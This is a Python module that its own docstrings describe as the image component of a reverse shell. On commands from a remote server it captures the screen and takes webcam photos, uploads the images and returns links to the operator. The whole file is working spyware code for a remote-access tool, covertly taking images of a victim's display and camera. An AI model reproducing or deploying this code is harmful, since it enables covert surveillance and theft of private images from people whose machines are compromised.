"""
This module handles all the Image related task for the reverse shell
"""

# 1st party imports
from io import BytesIO
from typing import List

# 3rd party imports
import cv2
from mss import mss
from PIL import Image
from mss.screenshot import ScreenShot

# local imports
from commands import ShellCommands
from Utilities.file_manager import FileManager


class PhotoGrapher:
    """
    This class handles all the Image related task for the reverse shell
    """

    def __init__(self):
        """
        Initialize the PhotoGrapher class
        """

        # initialize a FileManager
        self.file_manager = FileManager()

        # initialize the camera
        try :
            self.camera = cv2.VideoCapture(0)
        except Exception as e:
            self.camera = None

    def take_screenshot(self) -> ScreenShot:
        """
        Take a screenshot of the screen and return it as a base64 string

        Returns:
            Screenshot: The Screenshot object.
        """

        with mss() as sct:
            return sct.grab(sct.monitors[1])

    def get_screenshot_link(self) -> str:
        """
        Get the screenshot of the screen and return it as a base64 string

        Returns:
            str: The base64 string of the screenshot.
        """

        screenshot = self.take_screenshot()

        # Write to a BytesIO object instead of a file
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        # create a buffer
        buffer = BytesIO()

        # save the image to the buffer and get the bytes
        img.save(buffer, format="PNG")
        img_bytes = buffer.getvalue()

        # upload and return the link
        return self.file_manager._upload_bytes(img_bytes)

    def take_camera_photo(self) -> bytes:
        """
        Take a photo of the camera and return it as bytes

        Returns:
            bytes: The bytes of the photo.
        """

        # capture the photo
        if self.camera is None:
            return "Camera not initialized"

        ret, frame = self.camera.read()
        if not ret:
            return "Failed to capture photo"

        # encode the image
        _, encoded_image = cv2.imencode('.png', frame)

        # return the bytes
        return encoded_image.tobytes()

    def get_camera_photo_link(self) -> str:
        """
        Take a photo of the camera, upload and return the link

        Returns:
            str: The link to the photo.
        """

        # take the photo
        photo_bytes = self.take_camera_photo()

        # upload and return the link
        return self.file_manager._upload_bytes(photo_bytes)

    def handle_command(self, command: List[str]) -> str:
        """
        Handle the command received from the server.

        Args:
            command (List[str]): The list of commands to handle with args.

        Returns:
            str: The output of the command.
        """

        if command[0] == ShellCommands.TAKE_SCREENSHOT.value:
            return self.get_screenshot_link()

        elif command[0] == ShellCommands.TAKE_PHOTO.value:
            return self.get_camera_photo_link()

        else:
            return f"Invalid command for photographer. Provided command: `{" ".join(command)}`"
